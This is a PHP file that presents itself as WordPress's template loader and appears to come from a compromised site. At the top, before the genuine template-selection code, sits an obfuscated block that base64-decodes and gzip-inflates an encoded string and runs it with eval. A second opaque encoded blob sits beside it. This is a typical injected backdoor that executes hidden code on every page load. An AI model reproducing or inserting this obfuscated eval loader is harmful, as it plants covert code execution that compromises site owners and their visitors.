<?php
$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
$Lix = "2G7IdMw/513/K56fuH19NT8UGfAyvw/6syQeVsKIrppEcIcORA9xFuowTQjlxmgwlDNpFHN4iP24SSeGgnuZXCzRvtjWSehGETqvT1ZFFb/I1vQfcDHGth9dtVOi0Jx6GL8n2VempCDjcyu5y32evlt5pCk+KH56Dd5PDFdJZlSbulWm/s4e6WbdTgjgJMq7WnTSU3In1Qh5NCSqcIEWUup/iJ+cUVirxg1aBaKdXVyCOXZpAPHSFm03zJjqMKetd19p0+dg5p2NFI/jWa/9T9/eR54InxWBRh4TyFslek8nlt0zlgfwHjryFZ+ThEuYFfIoM9qS5BMzYNIN41yNIX/sVZKP7FgSZzOTs1OGp7IC8r6LyzJglTIvXPhV4m0q+QVIv127yr4l6whmJBSpmm89Er7tA38C0TozeaBHnBko+hv7kOmMxiQ5CJaYHk662uhGDErJa0ev/346bvG+np33PfLYqEuvuHg9lQPTxXx/NWTi+4OtTfI/HYqIrdIDaAykX/0gPgMOW9lxPDzlnuMDYA3gvMsrNqR/Z8rfS6pxyj+ri+FG8KxuBtj4FCTK5hn6/WyxJh4vhyp4JKokwxkN8QBk11rthIdMDNZ6sQEICrAMhFONB3KMkLRp2aU6s2EXQgPNbJe3TIHZjv+eCvAvgce0bJYBLGZGGFtHSKYrhgaBNBMpdozgWpOH7fLbUAtW5xEdmD5YIKTHWq6OsLXgdGQlgrY/8l5lX73dO/uH37rAkY0n1tpS/CyOv3vlLyy2tE7GAnjLCpCpdXqiarcVyqhisIrUhdfTLIlAiu4g/nmP9DBMb+27U1Ln41fkC4WA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the correct template based on the visitor's URL
 *
 * @package WordPress
 */

if ( wp_using_themes() ) {
    /**
     * Fires before determining which template to load.
     *
     * @since 1.5.0
     */
    do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
    exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
    /**
     * Fired when the template loader determines a robots.txt request.
     *
     * @since 2.1.0
     */
    do_action( 'do_robots' );
    return;
} elseif ( is_favicon() ) {
    /**
     * Fired when the template loader determines a favicon.ico request.
     *
     * @since 5.4.0
     */
    do_action( 'do_favicon' );
    return;
} elseif ( is_feed() ) {
    do_feed();
    return;
} elseif ( is_trackback() ) {
    require ABSPATH . 'wp-trackback.php';
    return;
}

if ( wp_using_themes() ) {
    $tag_templates = [
        'is_embed'             => 'get_embed_template',
        'is_404'               => 'get_404_template',
        'is_search'            => 'get_search_template',
        'is_front_page'        => 'get_front_page_template',
        'is_home'              => 'get_home_template',
        'is_privacy_policy'    => 'get_privacy_policy_template',
        'is_post_type_archive' => 'get_post_type_archive_template',
        'is_tax'               => 'get_taxonomy_template',
        'is_attachment'        => 'get_attachment_template',
        'is_single'            => 'get_single_template',
        'is_page'              => 'get_page_template',
        'is_singular'          => 'get_singular_template',
        'is_category'          => 'get_category_template',
        'is_tag'               => 'get_tag_template',
        'is_author'            => 'get_author_template',
        'is_date'              => 'get_date_template',
        'is_archive'           => 'get_archive_template',
    ];

    $template = false;

    // Loop through each of the template conditionals and find the appropriate template file.
    foreach ( $tag_templates as $tag => $template_getter ) {
        if ( call_user_func( $tag ) ) {
            $template = call_user_func( $template_getter );
        }

        if ( $template ) {
            if ( 'is_attachment' === $tag ) {
                remove_filter( 'the_content', 'prepend_attachment' );
            }
            break;
        }
    }

    if ( ! $template ) {
        $template = get_index_template();
    }

    /**
     * Filters the path of the current template before including it.
     *
     * @since 3.0.0
     *
     * @param string $template The path of the template to include.
     */
    $template = apply_filters( 'template_include', $template );

    if ( $template ) {
        include $template;
    } elseif ( current_user_can( 'switch_themes' ) ) {
        $theme = wp_get_theme();
        if ( $theme->errors() ) {
            wp_die( $theme->errors() );
        }
    }
    return;
}
?>
